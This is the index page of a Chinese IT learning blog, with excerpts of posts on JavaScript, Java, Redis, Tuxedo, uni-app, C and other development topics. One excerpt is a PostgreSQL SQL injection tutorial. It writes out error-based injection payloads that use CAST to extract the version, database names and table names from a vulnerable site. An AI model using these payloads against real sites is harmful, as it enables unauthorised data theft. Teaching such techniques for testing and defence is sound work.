<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="IT学习者博客">
		<meta property="og:title" content="IT学习者博客" />
<meta property="og:description" content="IT学习者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://itnewbiea.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="IT学习者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9d0d135d471d69885aa092ae379d0add/" rel="bookmark">
			关于js内部处理方法的那点事
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 今天看到一个比较有意思的面试题 console.log([1]+[2]) 它输出的答案是'12', 这个之前在我的认知了不管任何类型只要 + ，那结果一定是个字符串，但是具体原因是因为什么，一直没深入研究过。
今天无意刷到了这个视频，也简单总结一下，方便日后查看，凡事要刨根问底，哈哈。
js内部有一个方法叫 toPrimitive(input,type) ，它接受两个参数，input(传入的值)，type(值类型)
1.input判断传入的值是不是原始类型的值（number,string,null,undefined,boolean,symbol）
是：直接返回
不是：执行input.value(),再次判断是否是原始数据类型，是：直接返回
还不是：执行 input.toString()，
input字符串转换； 对象： [object,type] type: 对象类型
console.log([]+[]) // 1.+号会执行toPrimitive()内部方法 // 2.console.log([].valueOf()) // 输出的是一个数组（[]）,还不是原始数据类型，继续往下走 // 3.console.log([].toString()) // 输出的是一个一个字符串，'' // 4.''+'' // 两个空字符串相加，还是一个空字符串 console.log([] + {}) /* ([].valueOf()) // 输出的是一个数组（[]）,还不是原始数据类型，继续往下走 ([].toString) //输出的是一个一个字符串，'',所以第一个输出的是'' 接下来再分析{} ({}.valueOf()) // 输出是一个对象（{}）,,还不是原始数据类型，继续往下走 ({}.toString) // [object type],type是对象类型，所以最后输出的是 [object,object] 最后输出 [object,object] */ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7745c30b7f34ed8e867148c5c6b6e043/" rel="bookmark">
			SQL注入漏洞（postgresql注入）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		以前孤陋寡闻对postgresql这个数据库少有了解，后来与几个目前在企业实习的朋友聊天才得知他们有的公司项目用的是postgresql，有的公司是正在将原本的数据库迁移到postgresql。可见postgresql比较热（毕竟免费且功能齐全）。
postgresql简称PG，是一种特性非常齐全的自由软件的对象-关系型数据库管理系统。
默认的端口是：5432，默认的用户名是： postgres ，默认的数据库也是：postgres 。
简单使用 连接数据库
psql -U 用户名 -h 主机号 [-d 数据库名,-p 端口号] 查库：\l
选库：\c 库名
查表：\d
查列：\d 表名
\x：查询结果以行或列显示切换
如果连接不上数据库就在，/etc/postgresql/版本数/main/pg_hba.conf中添加IP如下图中最下面的一行格式即可。
postgresql与MySQL的特性也有相通，比如information_schema也是存在的且与MySQL的使用大致相同，不过postgresql查表的限制都是public，啥意思？操作一下就知道了
MySQL查表时，table_schema限制为数据库名，postgresql为public。
postgresql有几个特有的查询关键字
current_catalog / current_database() 与MySQL中的database()作用相同，为当前数据库名
pg_database可查询所有的数据库（列名关键字为datname）
MySQL中的limit 0,1在postgresql只能以limit 1 offset 0格式存在
user / current_user / getpgusername()都可用于查询当前用户名
pg_stat_user_tables为当用户的表单所有信息，可用于查表名（列关键字为relname）
current_schema[()]表示当前模式名
pg_tables 是一个系统表，提供对数据库中每个表的信息的访问，通过对schemaname模式的限制得到表名
另外，postgresql只有--+注释符，像#、;%00都是不可以的。
SQL注入 联合注入就不说了，记住上面几个关键字，MySQL能union注入查询的，postgresql也是一样查询。
报错注入 postgresql的报错注入原理与MSSQL的相同利用强类型语言数据库特性，当类型不一致时将会报错带出敏感数据达到注入的目的。具体用到的函数与MSSQL相同，cast()或者convert()这种强制转换的函数在与一个数比较达到报错目的。（前提是目标网站开启了报错提示）。
查看版本： 1 AND 2=CAST((SELECT version())::text AS NUMERIC) 查库： 1 AND 2=CAST((SELECT current_database())::text AS NUMERIC) 1 AND 2=CAST((SELECT datname from pg_database limit 1 offset 0)::text AS NUMERIC) ……………… 查表： 1 AND 2=CAST((SELECT relname from pg_stat_user_tables limit 1 offset 0)::text AS NUMERIC) ……………… 查列： 1 AND 2=CAST((select column_name from information_schema.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7745c30b7f34ed8e867148c5c6b6e043/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/78b48e73ef6837238e9d6da7fd2a361a/" rel="bookmark">
			svg大小根据内容自适应
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 宽度内容自适应 let width = _.max(_.map(svg.children, function(s) { let b = s.getBBox(), w = b.x + b.width; if(s.style.strokeWidth.match(/\d+/)) { w += parseFloat(s.style.strokeWidth.match(/\d+/).shift()); } return w; })); svg.setAttribute('width', width); 高度内容自适应 let	height = _.max(_.map(svg.children, function(s) { let b = s.getBBox(), h = b.y + b.height; if(s.style.strokeWidth.match(/\d+/)) { h += parseFloat(s.style.strokeWidth.match(/\d+/).shift()); } return h; })); svg.setAttribute('height', height); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/948c55f11e43ee3384b7ac4838580868/" rel="bookmark">
			spring cloud alibaba - 集成sentinel
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、安装sentinel控制台 1、下载控制台jar 官网下载
高速下载
2、使用java命令运行 java -jar sentinel-dashboard-1.8.4.jar --server.port=8808 二、导入pom &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;/dependency&gt; 三、配置application.properties spring.cloud.sentinel.transport.dashboard=127.0.0.1:8808 四、使用sentinel @RestController public class HelloController { @DubboReference private HelloService helloService; /** * 可以在任何方法上使用 */ @SentinelResource(value = "hello", fallback = "fallback") @RequestMapping("/hello") public String sayHello() throws InterruptedException { Thread.sleep(800); helloService.sayHello(); return "ok"; } /** * 降级方法 */ public String fallback() { return "fail"; } } 五、配置限流规则 1、登录sentinel控制台 http://localhost:8808
默认用户名：sentinel 密码：sentinel
2、配置限流规则 3、使用jmeter测试 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c88c29e9bce950032cc8d7bdb56fdb06/" rel="bookmark">
			tuxedo 服务发布
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		tuxedod中发布的服务端一般都是通过C语言的。
tpsvrinit(int argc, char *argv[]){ } void interface(TPSVCINFO *rqst){ char logstr[1024*4]; /*接收客户端数据*/	memset(logstr, 0x00, sizeof(logstr)); sprintf(logstr, "%s%s%s%s%s%s", logstr, "==service name==", rqst-&gt;name, "==input str==[", rqst-&gt;data, "]"); userlog("==：%s",logstr); /*处理客户端数据业务*/	/*响应客户端数据*/	tpreturn(TPSUCCESS, 0, rqst-&gt;data, 0L, 0);//rqst-&gt;data	} C常用的方法
/*申请数组并清空*/ char logstr[1024*4]; memset(logstr, 0x00, sizeof(logstr)); /*将char转char*/ char ch[]="abcdefghijklmn"; char *s = ch; /*将char*的内容拷贝到char数组中*/ char *result ; char ip[20]; strcpy(ip, result);	/*将char的内容 按竖线进行分割*/ char confstr[64]; char *result = NULL; result = strtok(confstr, "|"); result = strtok(NULL, "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c88c29e9bce950032cc8d7bdb56fdb06/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dceccf37cf510f2be549f529d566fec8/" rel="bookmark">
			tuxedo服务配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Tuxedo介绍 Tuxedo是BEA公司（现被Oracle公司收购）的一个客户机、服务器的“中间件”产品，它在客户机和服务器之间进行调节，以保证正确的处理事务。它用C语言技术开发的并且有很高性能。 Tuxedo服务通讯可以分为三种：	**域间模式**的服务通讯、**WSL**模式的服务通讯、**JSL**模式的服务通讯。 二、域间通讯 使用TUXEDO组件/DOMAINS时，需要对管理配置作一些改变，它可以读取/请求另一个应用的交易（ProdCust）的数据。 涉及到3个关键的服务： **DMADM**(DOMAIN ADMINISTRATOR SERVER)，管理域的server,在运行时管理BDMCONFIG,对已登记的gateway group提供支持,在tuxedo系统中,**只能有一个DMADM**进程，且不能对它采用MSSQ,不能有REPLYQ。 **GWADM**(GATEWAY ADMINISTRATOR SERVER)，管理域的域网关进程,在运行时可以对某一组域网关进行管理,主要从DMADM那里取得域的配置信息,并对域网管进程及跨越域的全局事务的LOG文件进行管理。 **GWTDOMIN**(GATEWAY PROCESS)，处理域之前的互操作,使本地域和调用远程域可以互相调用彼此的service,其中GMADM和GWTDOMAIN必须在一个组中。 一个tuxedo应用只能有一个DMADM，可以在任何一个组中。一个tuxedo应用可以有多个GWADM,GWTDOMAIN对,一个组只能有一个GMADM,GWTDOMAIN对。一个本地域可以和多个远程域实现互操作。 domconfig 文件结构 *DM_LOCAL_DOMAINS #定义本地tuxedo域的信息,分别定义该域所在的组GWGRP,域类型TYPE,域的唯一标识,域间通信时日志的全路径,其中GWGRP, DOMAINID的值要与ubb文件中的定义匹配。 *DM_REMOTE_DOMAINS #DM_REMOTE_DOMAINS定义远程weblogic域的信息,分别定义域类型,域的唯一性标识,该id标识需要与在weblogic server中的配置名称吻合,否则通信将会失败,关于在weblogic中的相应配置下文将作详细描述# *DM_TDOMAIN #DM_TDOMAIN定义在DM_LOCAL_DOMAIN中已经说明的本地域和在DM_REMOTE_DOMAINS中已经说明的远程域的具体的通信ip地址以及通信端口,其中NWDEVICE指定tuxedo发布的server通信进程文件所在的路径# *DM_REMOTE_SERVICES #DDM_REMOTE_SERVICES定义当前域需要调用远程域的服务名称,本例中的服务作为被调用服务,所以此处可以为空 *DM_LOCAL_SERVICES #DM_LOCAL_SERVICES定义当前域对外发布的tuxedo service名称,可以通过RNAME重新命名service# 1、UBBCONFIG ubbconfig文件中，定义组以及服务
*GROUPS GDMADM	LMID=simple	GRPNO=3 OPENINFO=NONE *SERVERS DMADM	SRVGRP=GDMADM SRVID=100 GWADM	SRVGRP=GDMADM SRVID=200 GWRDOMAIN SRVGRP=GDMADM SRVID=300 2、DOMCONFIG 定义本地域名称TAPP_MYAPP，本地域交易服务interface，域通讯地址192.168.2.10:21011
远程域名称TAPP_BANK_0001，远程域交易服务ftp_srv，域通讯地址192.168.2.11:7503
*DM_RESOURCES VERSION=U22 *DM_LOCAL_DOMAINS TAPP_20_JK GWGRP=GDMADM TYPE=TDOMAIN DOMAINID="TAPP_MYAPP" BLOCKTIME=200 MAXDATALEN=4194304 MAXRDOM=89 DMTLOGDEV="/tuxedo/app/work/Logfile/dmtlog" DMTLOGNAME="DMTLOG" CONNECTION_POLICY=ON_STARTUP *DM_REMOTE_DOMAINS TAPP_BANK_0001 TYPE=TDOMAIN DOMAINID="TAPP_BANK_0001" *DM_TDOMAIN TAPP_MYAPP NWADDR="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dceccf37cf510f2be549f529d566fec8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7efdad756cc2765f9409f2742bad7229/" rel="bookmark">
			高质量java常用util类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		自定义断言工具类 package com.wlc.doc.util; import com.wlc.doc.exception.BusinessException; import lombok.extern.slf4j.Slf4j; import org.springframework.lang.Nullable; import org.springframework.util.Assert; import org.springframework.util.CollectionUtils; import org.springframework.util.ObjectUtils; import org.springframework.util.StringUtils; import java.util.Collection; import java.util.Map; /** * 描述: 老王专用断言 &lt;/br&gt; * 时间: 2021-02-25 9:28 &lt;/br&gt; * 作者：王林冲 */ @Slf4j public class AssertUtil extends Assert { /** * 期望值是等于,不满足期望，则抛异常 * @param o1 值1 * @param o2 值2 * @param message 异常消息 */ public static void isEquals(Object o1, Object o2 ,String message) { if (!o1.toString().equals(o2.toString())) { throw new BusinessException(message); } } /** * 期望值是不等于,不满足期望，则抛异常 * @param o1 值1 * @param o2 值2 * @param message 异常消息 */ public static void isNotEquals(Object o1, Object o2 ,String message) { if (o1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7efdad756cc2765f9409f2742bad7229/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/481e2fa06279b1245f2c4cff8f75a867/" rel="bookmark">
			Docker 搭建单机 Redis
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 docker run -d -p 6379:6379 --name redis-s redis:latest redis-server --appendonly no --requirepass abc123 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1c585943a993c76e95f565aa4cdfca68/" rel="bookmark">
			Uni-app之Nvue开发细节总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		uni-app App端内置了一个基于 weex 改进的原生渲染引擎，提供了原生渲染能力
适用场景
需要高性能的区域长列表或瀑布流滚动。webview的页面级长列表滚动是没有性能问题的，但页面中某个区域做长列表滚动，则需要使用nvue的list、recycle-list、waterfall等组件(详见)。这些组件的性能要高于vue页面里的区域滚动组件scroll-view。左右拖动的长列表。在webview里，通过swiper+scroll-view实现左右拖动的长列表，前端模拟下拉刷新，这套方案的性能不好。此时推荐使用nvue，比如新建uni-app项目时的新闻示例模板，就采用了nvue，切换很流畅如深度使用map组件，建议使用nvue。除了层级问题，App端nvue文件的map功能更完善，和小程序拉齐度更高，多端一致性更好。如深度使用video，建议使用nvue。比如如下2个场景：video内嵌到swiper中，以实现抖音式视频滑动切换，例子见插件市场；nvue的视频全屏后，通过cover-view实现内容覆盖，比如增加文字标题、分享按钮。对App启动速度要求极致化。App端如果首页使用nvue且在manifest里配置fast模式，那么App的启动速度可以控制在1秒左右。而使用vue页面的话，App的启动速度一般是3秒起，取决于你的代码性能和体积。 Nvue与vue区别
nvue 页面控制显隐只可以使用v-if不可以使用v-show。nvue 页面只能使用flex布局，不支持其他布局方式。文字内容，必须、只能在&lt;text&gt;组件下，只有&lt;text&gt;标签可以设置字体大小，字体颜色。不支持背景图background-image。但可以使用&lt;image&gt;组件和层级来实现类似web中的背景效果。css选择器支持的比较少，只能使用 class 选择器，class 进行绑定时只支持数组语法在 App.vue 中定义的全局js变量不会在 nvue 页面生效。globalData和vuex是生效的.不能在 style 中引入字体文件。可使用以下写法 beforeCreate() { const domModule = uni.requireNativePlugin('dom') domModule.addRule('fontFace', { 'fontFamily': "myIconfont", 'src': "url('http://at.alicdn.com/t/font_2234252_v3hj1klw6k9.ttf')" }); } 不能使用百分比布局，如width：100%Nvue与Vue直接可以通过uni.$on,uni.$emit进行通讯，注意要在界面销毁前调用uni.$off销毁监听器，或者使用uni.$once.Nvue与Vue共享数据vuex、uni.storage、globalData。推荐使用vuex（之后会出一篇简书总结vuex使用示例）。 兼容性
style：由于采用原生渲染，并非所有浏览器的 css 均支持，布局模型只支持 flex 布局设置render-whole="true"时，视图层将组件以及子组件的信息结构一次性和原生层通讯，通过整个节点的重绘提升了排版渲染性能。
设置render-whole="false"时，视图层将以子节点一个接着一个和原生层通讯再重绘。总体的渲染时间可能更久。目前暂不支持radial-gradient（径向渐变） 安卓与iOS区别
nvue 的各组件在安卓端默认是透明的，如果不设置background-color，可能会导致出现重影的问题。iOS下refresh可使用alwaysScrollableVertical支持上下滚动，支持下拉操作。如果定位元素超过容器边界，在 Android 下，超出部分将不可见，原因在于 Android 端元素 overflow默认值为hidden，但目前 Android 暂不支持设置 overflow: visibleiOS平台阴影box-shadow，安卓平台阴影elevation(组件的属性，不是css样式) {box-shadow:inset offset-x offset-y blur-radius color} {box-shadow:投影方式 X轴偏移量 Y轴偏移量 阴影模糊半径 阴影颜色} &lt;view elevation="5px"&gt;&lt;/view&gt; 作者：大码猴
链接：https://www.jianshu.com/p/2fc394637e23
来源：简书
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/538482bd8f159fb08ff942d03aaa7cd0/" rel="bookmark">
			git入门（8）- git detached from commitID
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当提交代码时，有可能会出现代码所在的分支跟自己创建分支不一致的情况，这时候往往不容易察觉，直到提交代码时，提示：
git detached from XXXX
这时候的不要慌张，我们要做的首先是将当前的分支切到一个我们可以掌控的分支上。
#git branch temp xxxx
然后切到想要使用的分支上，例如：
#git checkout master
然后，删除掉刚刚产生的temp分支，
#git branch -D temp
这时候再重新提交文件内容。当然有可能这时候在temp分支上有我们想要的commit内容。只需要执行git log temp。然后把相关的提交内容cherry-pick过来就可以了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/098a9844f726ddcf4a8642523371d718/" rel="bookmark">
			Redis入门完整教程：哨兵的安装和部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		上一节介绍了Redis Sentinel的基本架构，本节将介绍如何安装和部署
Redis Sentinel。
9.2.1　部署拓扑结构
下面将以3个Sentinel节点、1个主节点、2个从节点组成一个Redis
Sentinel进行说明，拓扑结构如图9-13所示。
具体的物理部署如表9-2所示。
9.2.2　部署Redis数据节点
9.1节提到过，Redis Sentinel中Redis数据节点没有做任何特殊配置，按
照之前章节介绍的方法启动就可以，下面以一个比较简单的配置进行说明。
1.启动主节点
配置：
redis-6379.conf
port 6379
daemonize yes
logfile "6379.log"
dbfilename "dump-6379.rdb"
dir "/opt/soft/redis/data/"
启动主节点：
redis-server redis-6379.conf
确认是否启动。一般来说只需要ping命令检测一下就可以，确认Redis数
据节点是否已经启动。
$ redis-cli -h 127.0.0.1 -p 6379 ping
PONG
此时拓扑结构如图9-14所示。
图9-14 启动主节点 2.启动两个从节点
配置：
两个从节点的配置是完全一样的，下面以一个从节点为例子进行说明，
和主节点的配置不一样的是添加了slaveof配置。
redis-6380.conf
port 6380
daemonize yes
logfile "6380.log"
dbfilename "dump-6380.rdb"
dir "/opt/soft/redis/data/"
slaveof 127.0.0.1 6379
启动两个从节点：
redis-server redis-6380.conf
redis-server redis-6381.conf
验证：
$ redis-cli -h 127.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/098a9844f726ddcf4a8642523371d718/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a11446c6895188ac0d20ce6111f3034d/" rel="bookmark">
			pdf.js在线预览PDF文件实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pdf.js是一款功能比较强大的在线预览PDF插件，自带“打印”,“搜索”,“翻页”等功能,强大且实现方便，并且兼容性比较好（兼容ie10及以上、谷歌、安卓，苹果）。
首先要下载PDF.js，官网地址：http://mozilla.github.io/pdf.js/。
选择prebuilt下载最新版本
下载下来的PDF.JS需要构建后才能使用，大家可以去网上找找已经构建完成的pdf.js包来用。
链接：https://pan.baidu.com/s/13i-CQxBrONytaZJaQk6v3w
提取码：o35m
我项目中将pdf.js放到static下面
项目成功启动，访问目录下的/generic/web/viewer.html，展示默认的compressed.tracemonkey-pldi-09.pdf文件
使用iframe标签去显示，引用viewer.html去调用子页面
&lt;body&gt; &lt;div class="wrapper"&gt; &lt;iframe id="displayPdfIframe" width="970" height="800"&gt;&lt;/iframe&gt; &lt;/div&gt; &lt;/body&gt; &lt;script type="text/javascript"&gt; $(function(){ $("#displayPdfIframe").attr("src",'../generic/web/viewer.html?file=放pdf文件URL'+pdf文件名+'.pdf?t='+Math.random()); }); &lt;/script&gt; 成功启动预览文件
上面是个人开发总结，有什么不对的地方欢迎各位道友指正，各位道友有啥疑问可以留言。
参考文章：http://www.ysxbohui.com/article/7
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4152aa721a852db984410bcfd7afca4b/" rel="bookmark">
			【C语言】三子棋游戏（详解）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家好，我是小突突
今天我想详细地和你讲解这个三子棋小游戏是怎样实现的。
目录
1.基本流程
2. 配置运行环境
3.代码过程 3.1菜单界面选择开始或者退出游戏 3.2.创建棋盘并初始化。
3.3打印棋盘。
4.玩家落子并打印棋盘
5.电脑落子并打印棋盘
6.判定胜负关系(输，赢，平局)
7.整体代码展示
7.1 test.c 7.2 game.c
7.3 game.h
1.基本流程 1.菜单界面选择开始或者退出游戏。
2.创建棋盘并初始化。
3.打印棋盘。
4.玩家落子并打印棋盘
5.电脑落子并打印棋盘
6.判定胜负关系(输，赢，平局)
2. 配置运行环境 本次游戏用到三个文件，两个源文件test.c，game.c，一个头game.h。其中，game.c，game.h可以称作一个游戏模块，为什么要这样做呢？因为多个文件可以分别处理各自模块的功能，能更好处理各个模块之间的逻辑并且便于后期调试，也使得代码的可读性提高。
3.代码过程 3.1菜单界面选择开始或者退出游戏 int main() { test(); return 0; } 打印菜单
void menu() { printf("******************\n"); printf("***** 1.play *****\n"); printf("***** 0.exit *****\n"); printf("******************\n"); } 选择数字，1代表玩游戏，0代表退出游戏
void test() { int input = 0; do { menu(); printf("请选择:&gt;"); scanf("%d", &amp;input); switch (input) { case 1: printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4152aa721a852db984410bcfd7afca4b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0a35c373e9dc76a1ea9f803e34a66c3c/" rel="bookmark">
			split()分割字符串
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 第一种分割：
String str = "abacad" String[] ary = str.split("a"); 得到的ary是{"b", "c", "d"}，长度为3 b c d 第二种分割：
String str = "abacad" String[] ary = str.split("[a]"); 得到的ary是{"", "b", "", "c", "", "d"},长度为5 b c d 加了中括号的分隔符"[]"会将相同符号转为空字符"" 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b96cb59fda876842682d07eaf60d9604/" rel="bookmark">
			【FPGA的基础快速入门16-------DHT１１数字温湿度传感器】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		FPGA的基础学习-------DHT１１数字温湿度传感器 DH１１简介数据格式数据时序 DH１１简介 DHT１１是一款温湿度复合传感器，传感器包括一个电容式感湿元件和一个NTC测温元件，并与一个高性能８位单片机相连接。
相对湿度和温度测量、成本低、长期稳定、响应快、抗干扰能力强。
数据格式 DHT11采用单总线通信，一次传送40位数据，高位先出
校验位为前面四个字节之和的末8位：
温度小数部分的最高位为1则表示负温度，否则为正温度：
数据时序 用户主机（MCU）发送一次开始信号后，DHT11从低功耗模式转换到高速模式，待主机开始信号结束后，DHT11发送相应信号，送出40bit的数据，并触发一次信采集。
注意：
1、DHT11上电后要等待1s以跳过不稳定状态，在此期间不能发送任何指令。
2、结束信号后，DHT11内部重测环境温湿度数据，并记录数据，等待外部信号的到来。
3、主机从DHT11读取的温湿度数据总是前一次的测量值，如两次测间隔时间很长，请连续都两次，以第二次获得的值为实时温湿度值。
4、不建议连续多次读取传感器，每次读取传感器间隔大于2秒即可获得准确的数据。
时序参数：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/72a9f6a18f352a888f7e17cbbd87d88b/" rel="bookmark">
			Unity Shader - 搬砖日志 - URP PBR (抄作业篇，持续更新~)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 目的环境PBR 主要渲染方程D 项GGB(desmos)D_Term 完整 Shader G 项GGBG_Term 完整 Shader F 项GGBF_Term 完整 Shader D, G, F 带入公式PBR_Test_DGF.hlslDGF_Term 应用到具体 PBR 素材上完整 Shader - 只有 PBR + SH(Reflection Probe) + EmissivePBR__Emissive_Lib.hlslURP_PBR_Emissive.shader References 目的 这篇文章的目的：只为了备忘、和便于回顾、复习
只适合本人自己查看
环境 下面代码的运行环境
Unity : 2019.3.11f1Pipeline : URP 这篇文章，在 2021/12 - 2022/2 初，断断续续的时间片抄完的笔记
参考资料具体查看：Reference
下面多数是抄出来的作业，少部分有自己的理解、调整的东西
这篇 PBR 中，很多都是经过各个 optimization 之后的分支代码
PBR 主要渲染方程 L o ( p , w o ) = ∫ Ω ( k d c π + k s D G F 4 ( w o ⋅ n ) ( w i ⋅ n ) ) L i ( p , w i ) ( w i ⋅ n ) d w i L_o(p,w_o)=\int_{\Omega}(k_d \frac{c}{\pi} + k_s \frac {D G F}{4(w_o \cdot n)(w_i \cdot n)}) L_i(p,w_i)(w_i \cdot n) dw_i Lo​(p,wo​)=∫Ω​(kd​πc​+ks​4(wo​⋅n)(wi​⋅n)DGF​)Li​(p,wi​)(wi​⋅n)dwi​
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/72a9f6a18f352a888f7e17cbbd87d88b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4a3d99e48c5b77edd7e6b9d89d511549/" rel="bookmark">
			STM32 cudeIDE使用J-link下载程序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我也是新学，因为刚使用cudeIDE也很懵，今天终于把点灯程序下载进去了，所以做个分享，也是帮助像我一样的初学者。
我们编译好程序之后就点击这个小锤子，也可以Ctrl+B快捷键。这个是编译程序。
然后点击这个小甲壳虫(Debug)调试程序。
在第一次调试程序的时候都会弹出这样一个对话框。
然后我们点击调试器。
然后在调试探头这里选择你需要用到的选项。
弄完之后进去到这样的界面，可以单步调试，全速调试，不调式了就点退出。
退出之后，在点小锤子编译一下，然后点击小甲壳虫旁边的运行按钮。
完成之后程序我就下载进去了，小伙伴们可以试试 ，如果没有下载成功或者没有编译成功，看看自己的安装路径有没有中文，安装路径不能有中文，没有J-JINK的也需要自己下载驱动哟。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90e78aecadb25b92502bbbf0312ee404/" rel="bookmark">
			用生动形象的例子来理解同步、异步、阻塞、非阻塞的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		同步、异步是通信消息的一种机制。我们生活中沟通交流的机制有好多种，比如说面对面、电话、聊天软件、邮件等。面对面、电话交流就是同步交流机制，双方都是实时同步的交流。邮件、聊天软件属于延迟异步交流。
举例1：
同步：大哥老王坐在VIP包间的沙发上，跟小弟阿丢说，给我搞包烟，小弟口袋里刚好有一包，小弟立马从口袋里拿给大哥老王。（大哥说，小弟好好跟着大哥，以后有肉吃）
异步：大哥老王坐在VIP包间的沙发上，跟小弟阿银说，给我搞包烟，但是小银口袋里没烟，就跟大哥说，稍等，我这就下楼去买。过了10分钟后，小银就把烟交给了大哥老王。
阻塞、非阻塞是指程序（老王）等待调用结果时的一种状态。
举例2：
阻塞：大哥老王在小弟阿银去买烟的10分钟时间里，坐在沙发上傻了吧唧干等着，啥也没做。就纯属在等小弟阿银把烟送来。
非阻塞：大哥老王在小弟阿银去买烟的10分钟时间里，跟包间里的小姐姐K歌了，这段时间里，大哥都没有去想，小弟阿银能不能把烟送到。大哥老王边等烟边玩小姐姐。
同步、异步、阻塞、非阻塞几种组合举例理解：
同步、异步决定于小弟阿丢、阿银。阻塞、非阻塞决定于大哥老王喜不喜欢小姐姐。
同步阻塞（小弟阿丢、大哥老王不喜欢小姐姐）：
大哥老王身体不适，不喜欢小姐姐，心情郁闷只想抽烟，向阿丢要烟，阿丢立马回应大哥，刚好自己身上有烟。
同步非阻塞（小弟阿丢、大哥老王喜欢小姐姐）： 大哥老王最近生意做得风生水起，心情非常的愉快，向阿丢要烟，阿丢立马回应大哥，大哥同时也抱着小姐姐在一起。
异步阻塞（小弟阿银、大哥不喜欢小姐姐）：
大哥老王身体不适，不喜欢小姐姐，心情郁闷只想抽烟，向阿银要烟，阿银下楼买烟，没有及时回应大哥能不能给你烟，可能楼下没有烟卖的情况。
异步非阻塞（小弟阿银、大哥喜欢小姐姐）：
